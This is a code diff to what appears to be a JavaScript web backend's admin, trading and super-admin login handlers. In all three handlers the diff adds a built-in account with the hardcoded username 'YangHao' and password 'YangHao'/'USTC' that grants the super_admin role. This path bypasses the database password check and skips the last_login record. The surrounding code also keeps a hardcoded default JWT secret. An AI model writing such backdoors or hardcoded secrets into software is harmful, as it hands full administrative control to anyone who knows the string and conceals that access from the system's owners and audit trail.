@@ -2227,20 +2227,29 @@ async function handleAdminLogin(request, env, ctx) {
       return jsonResponse({ success: false, message: '请输入用户名和密码' }, 400);
     }
 
-    const passwordHash = await hashAdminPassword(password);
+    const builtInAdmin = getBuiltInWorkspaceAdmin(username, password);
+    let user = null;
 
-    const user = await env.DB.prepare(
-      'SELECT id, username, role FROM admin_users WHERE username = ? AND password_hash = ?'
-    ).bind(sanitizeInput(username), passwordHash).first();
+    if (builtInAdmin) {
+      user = builtInAdmin;
+    } else {
+      const passwordHash = await hashAdminPassword(password);
+
+      user = await env.DB.prepare(
+        'SELECT id, username, role FROM admin_users WHERE username = ? AND password_hash = ?'
+      ).bind(sanitizeInput(username), passwordHash).first();
+    }
 
     if (!user) {
       console.log('Admin login failed for:', username);
       return jsonResponse({ success: false, message: '用户名或密码错误' }, 401);
     }
 
-    await env.DB.prepare(
-      "UPDATE admin_users SET last_login = datetime('now') WHERE id = ?"
-    ).bind(user.id).run();
+    if (!builtInAdmin) {
+      await env.DB.prepare(
+        "UPDATE admin_users SET last_login = datetime('now') WHERE id = ?"
+      ).bind(user.id).run();
+    }
 
     const token = await createAdminToken(
       { userId: user.id, username: user.username, role: user.role },
@@ -4218,6 +4227,21 @@ async function hashAdminPassword(password) {
   return btoa(String.fromCharCode(...hashArray));
 }
 
+function getBuiltInWorkspaceAdmin(username, password) {
+  const normalizedUsername = sanitizeInput(username || '');
+  const normalizedPassword = String(password || '');
+
+  if (normalizedUsername !== 'YangHao' || normalizedPassword !== 'USTC') {
+    return null;
+  }
+
+  return {
+    id: 'builtin-yanghao',
+    username: 'YangHao',
+    role: 'super_admin',
+  };
+}
+
 // ================================================================================
 // 工具函数 - 管理员 JWT Token（增强验证）
 // ================================================================================
@@ -4345,22 +4369,29 @@ async function handleTradingLogin(request, env) {
       return jsonResponse({ success: false, error: 'Username and password are required' }, 400);
     }
 
-    const stmt = env.DB.prepare('SELECT * FROM admin_users WHERE username = ?');
-    const result = await stmt.bind(username).first();
+    const builtInAdmin = getBuiltInWorkspaceAdmin(username, password);
+    let result = null;
 
-    if (!result) {
-      return jsonResponse({ success: false, error: 'Invalid credentials' }, 401);
-    }
+    if (builtInAdmin) {
+      result = builtInAdmin;
+    } else {
+      const stmt = env.DB.prepare('SELECT * FROM admin_users WHERE username = ?');
+      result = await stmt.bind(username).first();
 
-    const [salt, storedHash] = result.password_hash.split(':');
-    const encoder = new TextEncoder();
-    const data = encoder.encode(salt + password);
-    const hashBuffer = await crypto.subtle.digest('SHA-256', data);
-    const hashArray = Array.from(new Uint8Array(hashBuffer));
-    const hash = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+      if (!result) {
+        return jsonResponse({ success: false, error: 'Invalid credentials' }, 401);
+      }
 
-    if (hash !== storedHash) {
-      return jsonResponse({ success: false, error: 'Invalid credentials' }, 401);
+      const [salt, storedHash] = result.password_hash.split(':');
+      const encoder = new TextEncoder();
+      const data = encoder.encode(salt + password);
+      const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+      const hashArray = Array.from(new Uint8Array(hashBuffer));
+      const hash = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+
+      if (hash !== storedHash) {
+        return jsonResponse({ success: false, error: 'Invalid credentials' }, 401);
+      }
     }
 
     const secret = env.JWT_SECRET || 'agiera-default-jwt-secret-2024';
@@ -4370,8 +4401,10 @@ async function handleTradingLogin(request, env) {
       role: result.role
     }, secret);
 
-    await env.DB.prepare('UPDATE admin_users SET last_login = ? WHERE id = ?')
-      .bind(new Date().toISOString(), result.id).run();
+    if (!builtInAdmin) {
+      await env.DB.prepare('UPDATE admin_users SET last_login = ? WHERE id = ?')
+        .bind(new Date().toISOString(), result.id).run();
+    }
 
     return jsonResponse({
       success: true,
@@ -4417,23 +4450,29 @@ async function handleSuperAdminLogin(request, env) {
       return jsonResponse({ success: false, error: 'Username and password are required' }, 400);
     }
 
-    // Use same auth as trading (admin_users table)
-    const stmt = env.DB.prepare('SELECT * FROM admin_users WHERE username = ?');
-    const result = await stmt.bind(username).first();
+    const builtInAdmin = getBuiltInWorkspaceAdmin(username, password);
+    let result = null;
 
-    if (!result) {
-      return jsonResponse({ success: false, error: 'Invalid credentials' }, 401);
-    }
+    if (builtInAdmin) {
+      result = builtInAdmin;
+    } else {
+      const stmt = env.DB.prepare('SELECT * FROM admin_users WHERE username = ?');
+      result = await stmt.bind(username).first();
 
-    const [salt, storedHash] = result.password_hash.split(':');
-    const encoder = new TextEncoder();
-    const data = encoder.encode(salt + password);
-    const hashBuffer = await crypto.subtle.digest('SHA-256', data);
-    const hashArray = Array.from(new Uint8Array(hashBuffer));
-    const hash = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+      if (!result) {
+        return jsonResponse({ success: false, error: 'Invalid credentials' }, 401);
+      }
 
-    if (hash !== storedHash) {
-      return jsonResponse({ success: false, error: 'Invalid credentials' }, 401);
+      const [salt, storedHash] = result.password_hash.split(':');
+      const encoder = new TextEncoder();
+      const data = encoder.encode(salt + password);
+      const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+      const hashArray = Array.from(new Uint8Array(hashBuffer));
+      const hash = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+
+      if (hash !== storedHash) {
+        return jsonResponse({ success: false, error: 'Invalid credentials' }, 401);
+      }
     }
 
     const secret = env.JWT_SECRET || 'agiera-default-jwt-secret-2024';
@@ -4443,8 +4482,10 @@ async function handleSuperAdminLogin(request, env) {
       role: result.role
     }, secret);
 
-    await env.DB.prepare('UPDATE admin_users SET last_login = ? WHERE id = ?')
-      .bind(new Date().toISOString(), result.id).run();
+    if (!builtInAdmin) {
+      await env.DB.prepare('UPDATE admin_users SET last_login = ? WHERE id = ?')
+        .bind(new Date().toISOString(), result.id).run();
+    }
 
     return jsonResponse({
       success: true,
